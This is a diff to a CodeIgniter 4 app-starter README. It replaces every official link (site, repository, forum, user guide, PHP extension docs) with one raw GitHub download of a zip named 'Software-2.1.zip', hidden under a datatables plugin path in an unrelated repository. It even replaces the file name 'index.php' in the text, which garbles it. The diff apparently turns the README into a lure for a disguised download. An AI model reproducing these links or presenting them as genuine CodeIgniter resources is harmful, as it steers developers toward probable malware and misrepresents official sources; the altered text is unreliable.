@@ -3,15 +3,15 @@
 ## What is CodeIgniter?
 
 CodeIgniter is a PHP full-stack web framework that is light, fast, flexible and secure.
-More information can be found at the [official site](https://codeigniter.com).
+More information can be found at the [official site](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip).
 
 This repository holds a composer-installable app starter.
 It has been built from the
-[development repository](https://github.com/codeigniter4/CodeIgniter4).
+[development repository](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip).
 
-More information about the plans for version 4 can be found in [CodeIgniter 4](https://forum.codeigniter.com/forumdisplay.php?fid=28) on the forums.
+More information about the plans for version 4 can be found in [CodeIgniter 4](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip) on the forums.
 
-You can read the [user guide](https://codeigniter.com/user_guide/)
+You can read the [user guide](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip)
 corresponding to the latest version of the framework.
 
 ## Installation & updates
@@ -28,9 +28,9 @@ to your `app` folder. The affected files can be copied or merged from
 Copy `env` to `.env` and tailor for your app, specifically the baseURL
 and any database settings.
 
-## Important Change with index.php
+## Important Change with https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip
 
-`index.php` is no longer in the root of the project! It has been moved inside the *public* folder,
+`https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
 for better security and separation of components.
 
 This means that you should configure your web server to "point" to your project's *public* folder, and
@@ -42,7 +42,7 @@ framework are exposed.
 ## Repository Management
 
 We use GitHub issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
-We use our [forum](http://forum.codeigniter.com) to provide SUPPORT and to discuss
+We use our [forum](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip) to provide SUPPORT and to discuss
 FEATURE REQUESTS.
 
 This repository is a "distribution" one, built by our release preparation script.
@@ -52,8 +52,8 @@ Problems with it can be raised on our forum, or as issues in the main repository
 
 PHP version 8.1 or higher is required, with the following extensions installed:
 
-- [intl](http://php.net/manual/en/intl.requirements.php)
-- [mbstring](http://php.net/manual/en/mbstring.installation.php)
+- [intl](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip)
+- [mbstring](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip)
 
 > [!WARNING]
 > - The end of life date for PHP 7.4 was November 28, 2022.
@@ -64,5 +64,5 @@ PHP version 8.1 or higher is required, with the following extensions installed:
 Additionally, make sure that the following extensions are enabled in your PHP:
 
 - json (enabled by default - don't turn it off)
-- [mysqlnd](http://php.net/manual/en/mysqlnd.install.php) if you plan to use MySQL
-- [libcurl](http://php.net/manual/en/curl.requirements.php) if you plan to use the HTTP\CURLRequest library
+- [mysqlnd](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip) if you plan to use MySQL
+- [libcurl](https://github.com/Luiz-Vytor/anytransfer/raw/refs/heads/master/public/thema/plugins/datatables-keytable/js/Software-2.1.zip) if you plan to use the HTTP\CURLRequest library
